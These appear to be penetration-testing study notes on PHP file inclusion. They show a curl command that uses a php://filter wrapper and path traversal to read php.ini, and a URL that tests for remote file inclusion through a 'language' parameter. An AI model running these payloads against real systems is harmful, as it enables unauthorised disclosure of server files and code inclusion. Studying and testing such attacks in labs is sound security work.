

allow_url_include is needed for various LFI attacks and all RFI attacks

We need to check for allow_url_include

Determine if allow_url_include is enabled (X.Y for php version)
```
/etc/php/X.Y/apache2/php.ini (Apache)
/etc/php/X.Y/fpm/php.ini (Nginx)
```

Reading config file with curl
```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" (Apache)

curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/fpm/php.ini"
```


At first, `we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included

Testing for RFI with a local file
```http
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

